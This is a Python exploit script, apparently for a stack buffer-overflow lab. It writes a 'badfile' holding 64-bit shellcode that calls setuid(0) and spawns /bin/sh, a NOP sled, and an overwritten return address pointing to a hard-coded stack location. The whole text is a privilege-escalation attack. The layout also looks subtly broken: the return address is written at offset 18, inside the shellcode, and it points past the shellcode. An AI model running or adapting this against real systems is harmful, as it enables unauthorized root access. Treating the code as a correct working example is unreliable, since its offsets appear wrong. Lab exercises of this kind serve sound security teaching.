#!/usr/bin/python3
import sys

# 64-bit shellcode with setuid(0)
shellcode = (
    "\x48\x31\xff"              # xor rdi, rdi
    "\x48\x31\xc0"              # xor rax, rax
    "\xb0\x69"                  # mov al, 0x69
    "\x0f\x05"                  # syscall (setuid)
    "\x48\x31\xd2"              # xor rdx, rdx
    "\x52"                      # push rdx
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov rax, '/bin//sh'
    "\x50"                      # push rax
    "\x48\x89\xe7"              # mov rdi, rsp
    "\x52"                      # push rdx
    "\x57"                      # push rdi
    "\x48\x89\xe6"              # mov rsi, rsp
    "\x48\x31\xc0"              # xor rax, rax
    "\xb0\x3b"                  # mov al, 0x3b
    "\x0f\x05"                  # syscall (execve)
).encode('latin-1')

content = bytearray(0x90 for i in range(517))

# Put shellcode at the BEGINNING (it will be in str array)
start = 0
content[start:start + len(shellcode)] = shellcode

# Offset to return address in buffer
offset = 18

# Point return address to str array (with GDB offset adjustment)
str_addr = 0x7fffffffd938
ret = str_addr + 80  # Add offset for GDB difference

L = 8
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)
